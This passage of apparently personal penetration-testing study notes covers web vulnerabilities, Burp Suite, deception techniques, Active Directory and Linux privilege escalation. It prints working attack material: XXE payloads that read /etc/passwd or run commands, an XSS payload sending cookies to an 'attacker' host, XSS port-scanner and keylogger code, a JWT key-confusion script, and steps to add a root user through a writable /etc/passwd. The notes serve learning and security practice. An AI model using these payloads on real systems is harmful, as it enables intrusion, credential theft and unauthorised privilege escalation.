the email server<br />• caused by extra data in the attacker&#39;s request fields, that are not interpreted by the server correctly</div><div class='page'><h1 class='title level-4'>File Inclusion</h1><br/>• caused by improper sanitazion of user input<br />• <strong>Local File Inclusion (LFI):</strong><br />   ◇ occurs when the application uses functions like PHP&#39;s <code>include, require, file_get_contents</code> without doing proper checks on user input<br />   ◇ when we&#39;re checking for a LFI vulnerability, we can try to read these files:<br />      ▪ Linux: <code>/etc/passwd</code><br />      ▪ Windows: <code>C:\boot.ini</code> or <code>C:\windows\win.ini</code><br />   ◇ if we can&#39;t read the file by giving in input its absolute path, we can still try path traversal attacks. Here are the most common attacks:<br />      ▪ <strong>appended path traversal</strong> - <code>include(&quot;/mydir&quot; + user_input)</code><br />         - we can perform a dot-dot-slash attack by appending some <code>../</code> before the path of the file we want to read<br />      ▪ <strong>prepended path traversal</strong> - <code>include(user_input + &quot;.txt&quot;)</code><br />         - use the <code>file://</code> scheme, if it is supported by the language. So the payload would be <code>file://localhost/etc/passwd?var=</code><br />         - <em>(PHP &lt;5.3.4)</em> adding a null byte (<code>%00</code>) at the end of the payload<br />      ▪ <strong>appended and prepended path traversal</strong> - <code>include(&quot;/mydir&quot; + user_input + &quot;.txt&quot;)</code><br />         - <em>(PHP &lt;5.3.4)</em> dot-dot-slash attack + null byte<br /><br />• <strong>Remote File Inclusion (RFI)</strong>:<br />   ◇ occurs when an attacker is able to include a file from a remote server<br /><br />• useful links:<br />   ◇ <a href="https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks">https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File Inclusion - Path Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks</a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Broken Authentication</h1><br/><em><span style="text-decoration:underline;">Types of attack</span></em>:<br /><br />• <strong>Dictionary attack</strong>: classic bruteforcing of login credentials with a wordlist.<br />• <strong>Re-registration</strong>:<br />   ◇ caused if the user input is not properly sanitized<br />   ◇ we can get access to the content of a user that already exists by re-registering that username but with a slight modification (for example adding a space before the username).<br /> <br /><br /><br /></div><div class='page'><h1 class='title level-4'>File Upload Vulnerabilities</h1><br/>• there are different ways we can try to exploit a website with a file upload feature:<br />   ◇ overwriting existing files: if the web user has write permissions on the web pages and the uploaded file is not assigned with a new name, then we may be able to overwrite an existing file. Sometimes this lets us &#39;create&#39; new vulnerabilities in the site!<br />• bypassing filters (for client-side filtering we can just use <a href="Webservers_&_security--Web_Security--Tools--Burp_Suite.html">burp</a> to edit the request, for server-side filtering it&#39;s more difficult):<br />   ◇ <strong>extension validation</strong>: filter that compare the extension of the uploaded file to a blacklist/whitelist<br />      ▪ if you can succesfully upload a file with a completely random file extension (ex. .randomextension) then it&#39;s most definitely a blacklist filtering.<br />      ▪ there could be a vulnerability in the way the site parses the file name (for example it may check only the first dot it finds to determine the extension)<br />      ▪ in case of a blacklist, we can try to use analouge extensions for the file we can upload (for example, if it&#39;s a .php file, we could try these other analogue extensions: <br />         <code>.phtml,.php3,.php4,.php5,.php7,.phps,.php-s,.phar,.pht</code><br />   ◇ <strong>MIME validation</strong>: the content type header in the POST request is checked<br />      ▪ to see if this filter present, try to upload an innocent file you uploaded before, but change the MIME type first<br />   ◇ <strong>Magic Number validation</strong>: the string of bytes at the very beginning of the file is checked<br />      ▪ to see if this filter present, try to upload an innocent file you uploaded before, but change its magic number first<br />      ▪ if the server checks only the magic number, we can try to upload a script that has the magic number the server wants and then see if we manage to execute it<br />      ▪ how to edit the file signature of a file: use the command <code>hexeditor</code> .<br />         NOTE: you can&#39;t add bytes at the start of the file with hexeditor. To do that you first have to add random bytes with a normal text editor like vim.<br />   ◇ <strong>File Length filtering</strong> (usually not an issue for an attacker):<br />      ▪ to enumerate the filter, start by uploading a small file and then uploading progressively bigger files<br />   ◇ <strong>File Name filtering</strong>: removes &quot;bad characters&quot; that could cause problems on the file system when uploaded<br />   ◇ <strong>File Content filtering</strong>: more complicated filtering system that may scan the full contents of the file to be sure it&#39;s not spoofing its extension<br /><br />• when you do manage to succesfully upload a payload, if you don&#39;t know where the file is located you can try to use <a href="Penetration_Testing--Content_Discovery--Gobuster.html">gobuster</a> to enumerate the website<br />   ◇ in this case, the <code>-x php,txt,html</code> option can be really useful<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>JWT Tokens Vulnerabilities</h1><br/>• JWT are divided into 3 parts, base64 encoded and separated by a dot:<br />   ◇ <strong>Header</strong>: consists of the algorithm used and the type of the token. Here is an example:<code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}</code><br />      JWT supports these algorithms<br />      ▪ <em>HMAC</em> (symmetric)<br />      ▪ <em>RSA256, HS256</em> (asymmetric)<br />      ▪ <em>None</em>, no encryption used<br />   ◇ <strong>Payload</strong>, contains access given to a certain user and depends on the website<br />   ◇ <strong>Signature</strong>, used to grant integrity of data<br /><br />• Vulnerabilities exist but they are all caused by misconfiguration mistakes:<br />   ◇ if &quot;None&quot; algorithm is used, the signature is not checked and the attacker can freely edit the payload part. In the signature part you can write anything or even omit it completely (however you can&#39;t omit the dot!)<br />   ◇ RS256 to HS256: if we know the RSA public key, we can try to modify the algorithm in the header to HS256 and then use public key to sign the data. This works only if the function to verify the token is misconfigured! Here&#39;s a simple script in python to do that:<br />      <div class="codebox"><pre><span style="color:#333333;font-weight:400">import</span> jwt<br />public = <span style="color:#ff9d00;font-weight:700">open</span>(<span style="color:#3ad900;font-weight:400">&#39;public.pem&#39;</span>, <span style="color:#3ad900;font-weight:400">&#39;r&#39;</span>).read()<br /><span style="color:#ff9d00;font-weight:700">print</span> jwt.encode({<span style="color:#3ad900;font-weight:400">&quot;replace this&quot;</span>:<span style="color:#3ad900;font-weight:400">&quot;with the payload part&quot;</span>}, key=public, algorithm=<span style="color:#3ad900;font-weight:400">&#39;HS256&#39;</span>)</pre></div><br /><strong>IMPORTANT</strong>: this doesn&#39;t work for versions of pyjwt later than 0.4.3. So when you install the package, use <code>pip3 install pyjwt==0.4.3</code><br /><br />• useful links:<br />   ◇ <a href="https://jwt.io/">https://jwt.io/</a> (really useful site to decode a jwt token and do conversions)<br />   ◇ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON Web Token</a><br />   ◇ <a href="https://github.com/lmammino/jwt-cracker">https://github.com/lmammino/jwt-cracker</a> (to crack the HS256 secret of JWT tokens)<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>SSRF</h1><br/>• Server Side Request Forgery (SSRF) is a vulnerability where an attacker can communicate with internal services (generally protected by firewalls) by making further HTTP requests through the server<br />• caused by mistakes in controlling user input when the input is an URL/IP address. Here are some places where an SSRF can be spotted:<br />   ◇ URL parameter<br />      ▪ the parameter may not be full but it can also be a part of the hostname. Example:<br />         <code>http://example.com/item/2?param=api</code> makes a request to <code>api.example.com/item/2</code>.<br />         We can replace the parameter with <code>attacker.com?x=</code><br />      ▪ hidden field in a form<br />   ◇ common payloads: <code>http://127.0.0.1/ , http://localhost/ , http://0.0.0.0/, http://[::]/, http://::/</code><br />      ▪ you can also try to use other URL Schemas (<code>file://</code> to try to read files from the server itself)<br />      ▪ if these do not work, you can try to encode the IP in a decimal or hexadecimal format (<a href="https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72">https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72</a>)<br />      ▪ if that doesn&#39;t work, you can try to setup a server with a simple page that redirects to localhost, and then try to submit the URL of the page<br /><br />• useful links and tools:<br />   ◇ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Request Forgery</a><br />   ◇ <a href="https://requestbin.com/">https://requestbin.com/</a> (may be useful to spot a SSRF vulnerablity)<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>CSRF</h1><br/>• Cross Site Request Forgery (CSRF) occurs when a user visits a page on a site (usually created by the attacker), that performs an action on a different, vulnerable site, like resetting password etc.<br /><br />◇ useful links and tools:<br />   ▪ <a href="https://github.com/0xInfection/XSRFProbe">https://github.com/0xInfection/XSRFProbe</a>, tool that tests if a site vulnerable to CSRF and can also craft payloads <br /><br /><br /></div><div class='page'><h1 class='title level-4'>XXE</h1><br/>• XML External Entity (XXE) is a vulnerability that abuses features of <a href="Webservers_&_security--Web_Security--Web_Vulnerabilities--XXE--XML.html">XML</a> parser/data.<br />• can cause sensitive data exposure, DoS, and in the most extreme cases, RCE<br />• two types of XXE<br />   ◇ In-Band XXE attack, the attacker receive an immediate response to the XXE payload<br />   ◇ OOB (out of band) XXE attacks, or blind XXE, where there is no immediate response and the attacker has to reflect the output of the attack on another file or on their own server<br /><br />• using knowledge of <a href="Webservers_&_security--Web_Security--Web_Vulnerabilities--XXE--XML.html">XML</a> and <a href="Webservers_&_security--Web_Security--Web_Vulnerabilities--XXE--DTD.html">DTD</a> (explained below in this document), we can read files from the system. Here&#39;s how to do it:<br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">root</span> <span style="color:#333333;font-weight:400">[&lt;!ENTITY read</span> <span style="color:#333333;font-weight:400">SYSTEM</span> <span style="color:#000000;font-weight:700">&#39;file:///etc/passwd&#39;</span><span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;root&gt;<span style="color:#ffdd00;font-weight:400">&amp;read;</span>&lt;/root&gt;</pre></div><br />• if the <strong>php expect module</strong> is loaded, we can get RCE using this payload<br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">root</span> <span style="color:#333333;font-weight:400">[&lt;!ENTITY xxe</span> <span style="color:#333333;font-weight:400">SYSTEM</span> <span style="color:#3ad900;font-weight:400">&quot;expect://id (or another command)&quot;</span><span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;root&gt;<span style="color:#ffdd00;font-weight:400">&amp;xxe;</span>&lt;/root&gt;</pre></div><br /><br />• useful tools and links:<br />   ◇ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>XML</h1><br/>• eXstensible Markup Language (XML) is a markup language for storing and transporting data, platform and programming language indepedent.<br />• <a href="Webservers_&_security--Web_Security--Web_Vulnerabilities--XXE--DTD.html">DTD</a> and Schema can be used to <strong>validate</strong> a XML document, in other words to ensure the absence of any syntax error<br /><br />• Structure of an XML document<br />   ◇ XML Prolog (optional): <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code><br />   ◇ DOCTYPE declaration (optional): <code>&lt;!DOCTYPE root_element SYSTEM &quot;DTD_location&quot;&gt;</code>. Keep in mind that you can also declare a DTD <strong>inside</strong> the doctype declaration<br />   ◇ ROOT element: top-most element that encapsulates all the other ones. If the document doesn&#39;t have a root element it&#39;s considered invalid.<br />• like in HTML we can use attributes in XML too, pretty much in the same way as we do in HTML: <code>&lt;text category = &quot;message&quot;&gt;hello&lt;/text&gt;</code><br />• XML is case sensitive<br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>DTD</h1><br/>• Document Type Definition (DTD) defines the structure and legal elements/attributes of an <a href="Webservers_&_security--Web_Security--Web_Vulnerabilities--XXE--XML.html">XML</a> document<br /><br />• Structure (example):<br />   ◇ <code>&lt;!DOCTYPE note [  between these brackets elements are defined  ]&gt;</code> to define the root element of the document (in this case it&#39;s &quot;note&quot;)<br />   ◇ <code>&lt;!ELEMENT note (to,from,heading,body)&gt;</code>  to define the note element (must contain 4 elements)<br />   ◇ <code>&lt;!ELEMENT to (#PCDATA)&gt;</code> defines the element &quot;to&quot;, that has the type #PCDATA (parseable character data)<br />   ◇ <code>&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</code> to define an entity (sort of constant) named writer.<br />      ▪ This can be used in XML like this: <code>&amp;writer;</code><br />      ▪ Entities can also defined externally using <code>&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</code><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>XSS (Cross Site Scripting)</h1><br/>• caused by improper user input sanitation.<br />• XSS is possible in Javascript, VBScript, Flash and CSS<br /><br />• There are different types of XSS attacks:<br />   ◇ <strong>Stored XSS</strong>: most dangerous type of XSS attack.<br />      The attacker inserts malicious payload into the website&#39;s source code, so that every time a client visits the website, the malicious script is executed.<br />      A common payload to steal the cookie of the victim is this:<br />      <code>&lt;script&gt;window.location=&#39;http://attacker/?cookie=&#39;+document.cookie&lt;/script&gt;</code><br />   ◇ <strong>Reflected XSS:</strong> most common type of XSS attack.<br />      The attacker tricks a victim into clicking a URL with a malicious payload. The website includes the payload in response back to the user, and it&#39;s executed. A typical payload would be<br />      <code>http://example.com/search?keyword=&lt;script&gt;...&lt;/script&gt;</code><br />   ◇ <strong>DOM-Based XSS:</strong> similar to Reflected XSS, but the payload is injected by vulnerable client side code (NOT modified by the attacker!) that modifies the DOM of the page. It is not injected by the server.<br /><br /><br />• With XSS you can do a million things, including cookie stealing, keylogging, webcam snapshot, phishing, port scanning etc.<br />   ◇ how to IP and Port Scan with XSS: here&#39;s a simple example of a payload who scans all the ip addresses ranging from 192.168.0.0 to 192.168.0.255<br />      <div class="codebox"><pre>&lt;script&gt;<br /> <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#ff9d00;font-weight:700">let</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; <span style="color:#ff0044;font-weight:400">256</span>; i++) {<br />  <span style="color:#ff9d00;font-weight:700">let</span> ip = <span style="color:#3ad900;font-weight:400">&#39;192.168.0.&#39;</span> + i<br />  <span style="color:#0088ff;font-weight:400">// Creating an image element, if the resource can load, it logs to the link controlled by the attacker.</span><br />   <span style="color:#0088ff;font-weight:400">// NOTE: this payload probably doesn&#39;t work</span><br />  <span style="color:#ff9d00;font-weight:700">let</span> code = <span style="color:#3ad900;font-weight:400">&#39;&lt;img src=&quot;http://&#39;</span> + ip + <span style="color:#3ad900;font-weight:400">&#39;/favicon.ico&quot; onload=&quot;this.onerror=null; this.src=\&quot;http:/attacker/&#39;</span> + ip + <span style="color:#3ad900;font-weight:400">&#39;\&quot;&quot;&gt;&#39;</span><br />  document.body.innerHTML += code <span style="color:#0088ff;font-weight:400">// This is adding the image element to the webpage</span><br /> }<br />&lt;/script&gt;</pre></div><br />      ▪ Here&#39;s a more trustworthy payload for portscanning: <a href="https://github.com/aabeling/portscan">https://github.com/aabeling/portscan</a><br />      ▪ NOTE: Keep in mind that when doing this type of attack there are many factors that will effect results such as response times, firewall rules etc.<br />   ◇ How to create a keylogger using XSS: here&#39;s a simple example on how to do that<br />      <div class="codebox"><pre>&lt;script type=<span style="color:#3ad900;font-weight:400">&quot;text/javascript&quot;</span>&gt;<br /> <span style="color:#ff9d00;font-weight:700">let</span> l = <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>; <span style="color:#0088ff;font-weight:400">// Variable to store key-strokes in</span><br /> document.onkeypress = <span style="color:#ff9d00;font-weight:700">function</span> (e) { <span style="color:#0088ff;font-weight:400">// Event to listen for key presses</span><br />   l += e.key; <span style="color:#0088ff;font-weight:400">// If user types, log it to the l variable</span><br />   console.<span style="color:#ff9d00;font-weight:700">log</span>(l); <span style="color:#0088ff;font-weight:400">// update this line to post to your own server</span><br /> }<br />&lt;/script&gt;</pre></div><br /><br />• Methods to bypass filters:<br />   ◇ filter that removes all script tags from input:<br />      There are other tags in HTML that can execute js code. One example is this img tag: <code>&lt;img src=&#39;#&#39; onerror=alert(&quot;Hacked!&quot;)&gt;</code><br />   ◇ if a word is filtered in a really bad way (the word is removed only one time), there&#39;s a really smart and simple way to bypass the filter. Let&#39;s say the word <code>Hello</code> is filtered. In your input instead of Hello write <code>HelHellolo</code>. The filter finds and removes the word Hello, joins the substrings and if it doesn&#39;t do any other checks, you succesfully bypassed the filter.<br />   ◇ look out for HTTP headers!! Sometimes it&#39;s possible to inject js code there.<br /><br />• Protection methods from XSS<br />   ◇ escape all user input. This way any data your application has received is secure before rendering it for your end users<br />   ◇ validating input (blacklists and whitelists)<br />   ◇ sanitising, changing unacceptable user input into an acceptable format. Should not be used alone to battle XSS attacks.<br /><br />• useful links and tools:<br />   ◇ BeEF, penetration testing tool that focuses on the web browser and can be useful to do XSS attacks<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>SSTI</h1><br/>• happens when the user is able to pass in a parameter that can control the template engine of the server (the program that fill static HTML pages to make them dynamic)<br />• the effects of this vulnerability can range from XSS all the way to RCE<br />• the payloads depend on the template engine and framework the web application uses, but in general a common payload is <code>{{2+2}}</code><br /><br />• useful links and tools:<br />   ◇ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a><br />   ◇ <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a>, tool for automatic SSTI attack (NOTE: it requires python 2!!)<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>IDOR</h1><br/>• Insecure Direct Object Reference (IDOR) is an access control vulnerability that makes us access resources we wouldn&#39;t ordinarily be able to access. The vulnerability can be in<br />   ◇ <em>URL parameter</em>: <code>https://example.com/bank?account_number=1234</code>. Just by changing the account_number parameter we can access to other people&#39;s bank details<br />   ◇ <em>POST data</em>: can be in plain text, encoded or hashed<br />      ▪ if the POST data is none of the above, we can still try to detect IDOR by creating two accounts and swap the ID numbers between them<br />   ◇ in an AJAX request or something referenced in an endpoint referenced in a JavaScript file<br /><br />• caused by misconfiguration in the way user input is handled.<br /><br /></div><div class='page'><h1 class='title level-3'>Tools</h1><br/></div><div class='page'><h1 class='title level-4'>Burp Suite</h1><br/>Burp Suite is a tool used to perform security testing of web applications.<br /><br />• Tabs:<br />   ◇ proxy: to intercept/modify requests/responses<br />   ◇ repeater: to capture, modify, then resend the same request numerous times.<br />   ◇ intruder: to spray an endpoint with requests. if you&#39;re using the free version of Burp DON&#39;T WASTE TIME WITH THIS *#!$, use the extension TurboIntruder.<br />   ◇ decoder: to transform a data without googling an online tool every time<br />   ◇ comparer: to compare two pieces of data<br />   ◇ sequencer: to assess the randomness of session cookie values and other tokens<br />   ◇ extender: to load extensions in Burp. Some of them require the paid version but some of them don&#39;t<br />   ◇ target: to map out the apps we&#39;re targeting in a tree structure, to define scoping and to see all web vulnerabilities.<br /><br />• to use burp with your local browser, you need the <strong>FoxyProxy</strong> extension, and set it up so that it forwards all the traffic to 127.0.0.1:8080 (the default port of Burp)<br />• How to proxy HTTPS? Firefox shows that annoying warning page every time!<br />   ◇ step 1: with the intercept mode set to on, open your browser and go to <a href="http://burp/cert">http://burp/cert</a><br />   ◇ step 2: save the certificate somewhere<br />   ◇ step 3: go on firefox&#39;s settings and search for &quot;certificates&quot;<br />   ◇ step 4: click on the button &quot;view certificates&quot;<br />   ◇ step 5: click on &quot;import&quot; and select the file you just downloaded<br />   ◇ step 6: click on the checkbox that says &quot;Trust this CA to identify websites&quot; and click ok.<br /><br /><br />• Scoping, a.k.a let Burp only target a specific web application, and not every site we visit<br />   ◇ to do this we go to the tab &quot;Target&quot;, select the site we want to target, right click and click on &quot;Add to Scope&quot;<br />   ◇ if we go on the scope subtab we should see our website in the target scope section. This will be disable <strong>logging</strong> for out-of-scope traffic<br />   ◇ if we want to stop intercepting out-of-scope traffic we need to head to proxy options and select this checkbox<br /><a href=""><img src="images/33-1.png" alt="images/33-1.png" /></a><br /> <br />• BApp extensions:<br />   ◇ Request timer: this extension log the response time of the responses. This can be useful to find and exploit time-based vulnerablities<br /><br /><br />• Other tips:<br />   ◇ when injecting a payload in a request, you can URL encode it by pressing Ctrl + U<br />   ◇ when in the proxy section, Ctrl + R to send a request to repeater<br />   ◇ to create macros, go to the sessions subtab of project options<br />   ◇ attack types you can do with intruder:<br />      ▪ sniper: one payload set, intruder takes one payload at a time and substitute it in the defined position. <code>requests = numberOfWords * numberOfPositions</code><br />      ▪ battering ram: one payload set, but the same payload is put in every position rather than in each position in turn<br />      ▪ pitchfork: uses one payload set per position (like having numerous Snipers running at once)<br />      ▪ cluster bomb: uses one payload set per position, but unlike pitchfork, it tries every combination<br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-1'>Cyber Defense</h1><br/>Security models:<br />• The Bell-La Padula Model: (no write down, no read up)◇ used to achieve confidentiality<br />   ◇ users know about existence of objects (confidentiality is only partial)<br />• Biba model (no write up, no read down)◇ used to achieve confidentiality and integrity<br />   ◇ used particularly in situations where integrity is more important than confidentiality<br /><br />Incident Response: here are the 6 phases of how that happens:<br />◇ <em>preparation</em> of resources and plans<br />◇ <em>identification</em> of the threat<br />◇ <em>containment</em> to prevent other system and users from being impacted<br />◇ <em>eradication</em> of the active threat<br />◇ <em>recovery</em> of the impacted systems<br />◇ <em>Lessons learned</em> from the incident<br /><br />Cyber deception: ways to make hackers waste their time when they try to hack your network<br />NOTE: these techniques are useless (and some of them are probably illegal) to use in Attack/Defense competitions<br />• <strong>Honeypots</strong>: a network intended to mimic likely targets of cyberattacks, used to detect attacks or deflect them from a legitimate target<br />• <strong>Canary Tokens</strong>: (canarytokens.org)<br />   ◇ in short, <em>something</em> that triggers a notification when a potentially malicious actions is done by an attacker<br />• <strong>Port spoofing</strong>: (<a href="https://drk1wi.github.io/portspoof/">https://drk1wi.github.io/portspoof/</a>)<br />   ◇ technique that aims to make attackers waste a LOT of time when trying to scan ports on a machine<br />   ◇ Portspoof listens on a single port (default one is 4444), but the machine is configured so that every incoming connection is redirected to that port. This allows Portspoof to respond on any port, and when an attacker runs nmap on the machine, all ports are reported as open.<br />• <strong>Honey User Account</strong>:<br />   ◇ user that triggers an event when somebody tries to access it.<br />• <strong>Honeybadger</strong>: (<a href="https://github.com/adhdproject/honeybadger">https://github.com/adhdproject/honeybadger</a>)<br />   ◇ powerful Active Defense tool to determine the location of an attacker- using IP geolocation<br />   ◇ using Wireless Survey (a.k.a. the list of wifi networks you can connect to!)<br /><br /><br />◇ useful links:<br />   ▪ <a href="https://engage.mitre.org/matrix/">https://engage.mitre.org/matrix/</a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-1'>Windows</h1><br/></div><div class='page'><h1 class='title level-2'>Active Directory</h1><br/></div><div class='page'><h1 class='title level-3'>Description</h1><br/>• what is Active directory?<br />   1) directory service<br />   2) distributed, hierarchical database structure that contains information for locating, securing, managing and organizing computer and network resources (a.k.a. files, users, groups, network devices etc.).<br />      This database is also called <strong>AD DS Data Store</strong>, and it&#39;s located in the <code>%SystemRoot%\NTDS</code> directory (it&#39;s the ntds.dit file)<br />   3) something to control a Windows network<br /><br />• Components:<br />   ◇ <strong>Domain Controller</strong>: Windows server that handles<br />      ▪ storing the AD DS data store<br />      ▪ authentication and authorization services<br />      ▪ replicate updates from other domain controllers<br />      ▪ allows admin access to manage domain resources<br />   ◇ <strong>Organizational Units</strong> (OUs): containers for groups, computers, users, devices and other OUs.<br />   ◇ <strong>Users</strong>: there are four main types of users (but there could be more, depending on the network)<br />      ▪ Domain Admins: they control the domains, and are the only ones with access to the domain controller<br />      ▪ Service Accounts: they handle service maintenance. They can be domain admins.<br />      ▪ Local Administrators: they can make changes to local machines as an administrator (including managing users of the machine), but they can&#39;t access the domain controller<br />      ▪ Domain Users: normal users that have authorization to access the machines and do things.<br />   ◇ <strong>Groups</strong>: groups are used so it&#39;s easier to organize users and objects. There are two types of AD groups<br />      ▪ Security Groups: used to specify permissions for a large number of users<br />      ▪ Distribution Groups: used to specify email distribution lists (an attacker could need this for enumeration purposes)<br />   ◇ <strong>Trusts</strong>: mechanism for users in the network to gain access to other resources in the domain. There are two types of trusts<br />      ▪ Directional: the trust includes only 2 domains<br />      ▪ Transitive: the trust includes more than 2 domains<br />   ◇ <strong>Policies</strong>: rules that describe how the network operates<br />      ▪ Group Policy Objects (GPOs): policies that are applied just for a specific set of groups<br />   ◇ <strong>Domain Services</strong>: services the domain controller provides to the rest of the domain or tree. These are the main access point for attackers. The default domain services are:<br />      ▪ LDAP: provides communication between applications and directory services<br />      ▪ Certificate Services: allows the domain controller to handle public key certificates<br />      ▪ DNS, LLMNR, NBT-NS: Domain Name Services<br /><br />• Active Directory Forest:<br />   ◇ collection of one or more domain trees inside an AD network<br /><br />• There are two types of Active Directory:<br />   ◇ On-Premise Active Directory (AD)<br />      ▪ physical Active Directory network<br />      ▪ uses these authentication protocols: NTLM, LDAP/LDAPS, KERBEROS<br />   ◇ Azure Active Directory (AAD)<br />      ▪ cloud Active Directory network, used for online applications (like Microsoft Cloud services)<br />      ▪ Azure acts as a middle man between the physical AD and the users. This makes the network more secure.<br />      ▪ uses these authentication protocols: SAML, OAUTH 2.0, OpenID Connect<br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Powershell</h1><br/>• Execution Policy: safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts.<br />   To bypass this run in cmd the command <code>powershell -ep bypass</code><br />• Basic commands<br />   ◇ dot-source operator: used to import script files in the current session of ps. Example: <code>. .\evilscript.ps1</code><br />   ◇ <code>cat</code> or <code>type</code>: the equivalent of &#39;cat&#39; in Linux<br />   ◇ <code>icacls</code>: command to check permissions on a file/folder<br /><br /><br />• useful links and tools:<br />   ◇ PowerView, tool to gain network situational awareness on Windows Domains (<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a>).<br />      And also, <a href="https://www.hackingarticles.in/active-directory-enumeration-powerview/">https://www.hackingarticles.in/active-directory-enumeration-powerview/</a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-1'>Linux</h1><br/>Enviromental Variables:<br />• you can execute the command <code>env</code> to see all the variables<br />• to get the value of a specific variable use <code>echo $VARIABLE</code><br />• to set the value of a new/existing variable use <code>export VARIABLE=value</code><br />• here are the most important default env variables:<br />   ◇ PATH: specifies one or more directories (separated by a colon) that hold executable programs. When a generic command like <code>ls</code> or <code>cat</code> wants to be executed in a terminal or in a script, these directories are checked to see if the respective executable exists<br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Linux Privilege Escalation</h1><br/>• <em>Enumeration</em>:<br />   ◇ LinEnum (<a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a>), simple bash script that performs common commands to detect privilege escalation vulnerabilities<br />      ▪ output sections of the command:<br />         - kernel: shows information about kernel and its vulnerabilities<br />         - world-writable files: used to detect misconfigurations that allows to find sensitive writable files<br />         - SUID files: files that have the SETUID bit set. The command that LinEnum runs is <code>find / -perm -u=s -type f 2&gt;/dev/null</code><br />         - Crontab Contents: shows the scheduled cron jobs<br />   ◇ LinPEAS (<a href="https://github.com/ozonett/privilege-escalation-awesome-scripts-suite">https://github.com/ozonett/privilege-escalation-awesome-scripts-suite</a>)<br />      ▪ more easier to read than LinEnum<br />   ◇ sometimes users may type passwords on the command line, so it&#39;s a good think to check history files using <code>cat ~/.*history</code><br />   ◇ config files can also reveal plaintext passwords<br /><br />• <em>Exploitation</em>:<br />   ◇ <strong>Writable /etc/passwd file</strong>: to exploit this we can just create a new root user account by adding a line to the file<br />      1- first we create a password hash, using the command <code>openssl passwd -1 -salt &lt;salt&gt; &lt;password&gt;</code><br />      2- then we just add the line <code>&lt;username&gt;:&lt;passwordhash&gt;:0:0:root:/root:/bin/bash</code> or replace the root&#39;s password field with the hash<br />   ◇ <strong>Readable /etc/shadow file</strong>: we can exploit this by trying to crack the password hashes contained in the file<br />   ◇ <strong>Writable /etc/shadow file</strong>: this is even simpler, since we can just replace root password<br />      ▪ we can generate a new password hash with this command: <code>mkpasswd -m sha-512 password</code><br />   ◇ <strong>sudo misconfigurations</strong>:<br />      1- run the command <code>sudo -l</code><br />      2- If there are any commands you can execute as root, look for a way to get privilege escalation with those commands (this is a good place to start: <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>)<br />      3- There may be some enviromental variables that are inherited when a sudo command is run. That may be exploitable<br />   ◇ <strong>/etc/crontabs misconfigurations</strong>:<br />      ▪ sometimes there may be cron jobs that let root execute files we can write. We can modify the file with shellcode to get a shell with root permissions.<br />      ▪ look for enviromental variables defined in the file, especially for PATH<br />   ◇ <strong>SUID/SGID Executables</strong>: these are files you can execute as root. These files may contain some vulnerabilities:<br />      ▪ <strong>Shared Object Injection</strong>: happens when the binary tries to import a shared object (.so file) from a directory writable to us.<br />         1&gt; run the command <code>strace ./path/to/suid 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</code> to find the paths of the shared objects the executable imports<br />         2&gt; replace the file with one that spawns a shell (TODO: explain how)<br />      ▪ <strong>PATH variable exploitation</strong>: sometimes we have a SUID binary that executes commands like ps without indicating their absolute path. To exploit this we:<br />         1&gt; find the command that the program runs, using commands like <code>strings</code>. For example, let&#39;s say we have a binary that executes <code>ls</code>.<br />         2&gt; move in a directory writable to us and write the shellcode in a file named <code>ls</code> .<br />         3&gt; <span style="text-decoration:underline;">make the file executable</span><br />         4&gt; change the PATH variable so that it points to the directory where we just created our shellcode file. To do that we use the command <code>export PATH=/&lt;absolute_path_to_our_directory&gt;:$PATH</code><br />         5&gt; execute the binary<br />      ▪ <strong>Bash functions exploitation</strong> (only for bash 